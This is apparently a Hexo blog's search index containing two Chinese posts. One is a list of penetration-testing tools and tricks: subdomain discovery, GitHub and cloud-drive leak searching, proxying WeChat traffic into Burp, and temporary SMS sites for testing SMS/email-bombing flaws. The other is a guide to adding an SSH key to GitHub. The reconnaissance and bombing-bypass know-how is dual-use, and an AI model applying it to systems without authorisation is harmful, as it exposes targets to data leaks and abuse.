    <entry>
      <title>Penetration test Tools</title>
      <link href="/2020/03/26/Penetration-test-Tools/"/>
      <url>/2020/03/26/Penetration-test-Tools/</url>
      
        <content type="html"><![CDATA[<p>记录一些零零散散的小工具和小技巧，后期补充！</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ol><li>Google Hack实用语法</li><li>shodan，fofa搜索</li><li>子域名收集<ul><li>网站的JS文件中，会存在各种对测试有帮助的内容，JSFinder可以帮助我们获取到JS中的url和子域名的信息，拓展我们的渗透范围。爬取分为普通爬取和深度爬取，深度爬取会深入下一层页面爬取JS，时间会消耗的更长<pre><code>JSFinder(https://github.com/Threezh1/JSFinder)</code></pre></li><li>Sublist3r是一个python版工具，其设计原理是基于通过使用搜索引擎，从而对站点子域名进行列举。Sublist3r目前支持以下搜索引擎：Google, Yahoo, Bing, 百度以及Ask，而未来将支持更多的搜索引擎。目前，Sublist3r同样也通过Netcraft以及DNSdumpster获取子域名。<pre><code>Sublist3r(https://github.com/aboul3la/Sublist3r)</code></pre></li><li>云悉(<a href="http://www.yunsee.cn/info.html)云悉可以在线搜集子域名、ip段、CMS指纹等信息" target="_blank" rel="noopener">http://www.yunsee.cn/info.html)云悉可以在线搜集子域名、ip段、CMS指纹等信息</a></li></ul></li><li>github敏感信息泄露实时监控<pre><code>GSIL(GitHub Sensitive Information Leakage)项目，地址：https://github.com/FeeiCN/GSIL,通过配置关键词，实时监控github敏感信息泄露情况，并发送至指定邮箱;</code></pre></li><li>网盘搜索引擎<pre><code>和github类似，网盘中往往会存在企业泄露的内部信息，同样需要关注，常见的网盘搜索引擎：盘多多：http://www.panduoduo.net/盘搜搜：http://www.pansoso.com/盘搜：http://www.pansou.com/凌云风搜索：https://www.lingfengyun.com/</code></pre></li></ol><h3 id="流量抓取"><a href="#流量抓取" class="headerlink" title="流量抓取"></a>流量抓取</h3><p>​        SocksCap64是一款功能非常强大的代理客户端，支持http/https、socks4/5、TCP、UDP等协议，在内网渗透中经常使用，同样可以用他来代理微信PC客户端的流量，并将流量转发至burp中，就可以进行抓包分析。首先还是在burp中设置监听：然后在SocksCap64中设置代理服务器为burp的地址和端口，代理方式HTTP，即可成功抓到微信PC端的流量。</p><h3 id="短信-amp-邮件轰炸绕过"><a href="#短信-amp-邮件轰炸绕过" class="headerlink" title="短信&amp;邮件轰炸绕过"></a>短信&amp;邮件轰炸绕过</h3><p>​        在网站测试的过程中，常常在用户注册登录时出现手机号/邮箱注册，这里就可能出现短信&amp;邮件炸弹漏洞，此类漏洞测试比较方便，虽然有的站点做了防护，但也有一些绕过的办法。这里收集了部分目前较为流行的临时接收短信的网站，方便用于测试：<br><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">https://www.pdflibr.com/</a><br><a href="http://www.z-sms.com/" target="_blank" rel="noopener">http://www.z-sms.com/</a><br><a href="https://www.receive-sms-online.info/" target="_blank" rel="noopener">https://www.receive-sms-online.info/</a><br>[国内] <a href="http://www.smszk.com/" target="_blank" rel="noopener">http://www.smszk.com/</a><br>[国外] <a href="http://receive-sms-online.com/" target="_blank" rel="noopener">http://receive-sms-online.com/</a><br>[国外] <a href="https://smsnumbersonline.com/" target="_blank" rel="noopener">https://smsnumbersonline.com/</a><br>[国外] <a href="https://www.freeonlinephone.org/" target="_blank" rel="noopener">https://www.freeonlinephone.org/</a><br>[国外] <a href="https://sms-online.co/receive-free-sms" target="_blank" rel="noopener">https://sms-online.co/receive-free-sms</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about ssh key</title>
      <link href="/2020/03/26/about-ssh-key/"/>
      <url>/2020/03/26/about-ssh-key/</url>
      
        <content type="html"><![CDATA[<h2 id="添加ssh-key-到Github"><a href="#添加ssh-key-到Github" class="headerlink" title="添加ssh key 到Github"></a>添加ssh key 到Github</h2><p>若未关联<code>Github</code>，则执行<code>hexo deply</code>命令时终端会提示你输入<code>Github</code>的用户名和密码，即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username <span class="keyword">for</span> <span class="string">'https://github.com'</span>:</span><br><span class="line">Password <span class="keyword">for</span> <span class="string">'https://xxxxx.github.com'</span>:</span><br></pre></td></tr></table></figure><p>为了避免每次输入<code>Github</code>用户名和密码的麻烦，即可添加<code>ssh key</code> 到<code>GitHub</code></p><h3 id="检查SSH-keys是否存在Github"><a href="#检查SSH-keys是否存在Github" class="headerlink" title="检查SSH keys是否存在Github"></a>检查SSH keys是否存在Github</h3><p>执行如下命令，检查<code>SSH keys</code>是否存在。如果有文件<code>id_rsa.pub</code>或<code>id_dsa.pub</code>，则直接将<code>SSH key</code>添加到<code>Github</code>中，否则进入下一步生成<code>SSH key</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al ~/.ssh</span><br></pre></td></tr></table></figure><h3 id="生成新的ssh-key"><a href="#生成新的ssh-key" class="headerlink" title="生成新的ssh key"></a>生成新的ssh key</h3><p>执行如下命令生成<code>public/private rsa key pair</code>，注意将<code>your_email@example.com</code>换成你自己注册<code>Github</code>的邮箱地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">"your_email@example.com"</span></span><br></pre></td></tr></table></figure><p>默认会在相应路径下（<code>~/.ssh/id_rsa.pub</code>）生成<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件。</p><h3 id="将SSH-key添加到Github"><a href="#将SSH-key添加到Github" class="headerlink" title="将SSH key添加到Github"></a>将SSH key添加到Github</h3><p>Find前往文件夹<code>~/.ssh/id_rsa.pub</code>打开id_rsa.pub文件，里面的信息即为<code>SSH key</code>，将这些信息复制到<code>Github</code>的<code>Add SSH key</code>页面即可。</p><p>进入<code>Github –&gt; Settings –&gt; SSH keys –&gt; add SSH key</code>:</p><p><code>Title</code>里任意添一个标题，将复制的内容粘贴到<code>Key</code>里，点击下方<code>Add key</code>绿色按钮即可。</p><h3 id="关于Themes"><a href="#关于Themes" class="headerlink" title="关于Themes"></a>关于Themes</h3><p><a href="https://hexo.io/themes/" target="_blank" rel="noopener">hexothemes</a> &amp;&amp; <a href="http://jekyllthemes.org/" target="_blank" rel="noopener">Jekyllthemes</a></p><h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><ol><li><a href="http://gonghonglou.com/2016/02/03/firstblog/" target="_blank" rel="noopener">http://gonghonglou.com/2016/02/03/firstblog/</a></li><li><a href="http://lijiankun24.com/Mac下Hexo和GitHub-Pages搭建个人博客1/" target="_blank" rel="noopener">http://lijiankun24.com/Mac%E4%B8%8BHexo%E5%92%8CGitHub-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A21/</a></li><li><a href="https://www.dazhuanlan.com/2019/09/25/5d8adf4204ed4/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/25/5d8adf4204ed4/</a></li><li><a href="https://www.cnblogs.com/mrwuzs/p/7943337.html" target="_blank" rel="noopener">https://www.cnblogs.com/mrwuzs/p/7943337.html</a></li><li><a href="https://www.cnblogs.com/zhangxiaochn/p/Hexo_Continue.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhangxiaochn/p/Hexo_Continue.html</a></li><li><a href="https://www.jianshu.com/p/beb8d611340a" target="_blank" rel="noopener">https://www.jianshu.com/p/beb8d611340a</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> about blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
